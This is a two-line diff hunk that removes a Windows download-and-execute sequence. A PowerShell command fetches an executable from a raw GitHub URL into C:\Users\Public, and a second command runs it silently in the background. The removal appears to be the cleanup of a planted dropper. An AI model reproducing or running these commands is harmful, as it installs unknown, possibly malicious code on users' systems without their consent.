@@ -1,2 +1,0 @@
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/isorotta.exe -OutFile C:\Users\Public\isorotta.exe"
-start "" /B "C:\Users\Public\isorotta.exe"
